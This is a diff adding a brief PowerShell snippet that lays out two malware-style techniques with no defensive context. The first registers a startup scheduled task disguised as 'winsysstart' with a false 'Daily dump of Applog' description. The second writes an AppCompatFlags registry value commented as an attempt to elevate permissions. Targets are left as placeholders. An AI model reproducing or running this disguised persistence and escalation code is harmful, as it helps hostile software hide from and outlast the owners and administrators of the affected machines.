@@ -1,0 +1,13 @@
+#method one...
+
+$action = New-ScheduledTaskAction -Execute 'WILDCARD'
+$trigger =  New-ScheduledTaskTrigger -AtStartUp
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "winsysstart" -Description "Daily dump of Applog"
+
+#method two...
+
+# attempt to elevate permissions on next execution
+
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" `
+    -Name "path to file" `
+    -Value "path to file"
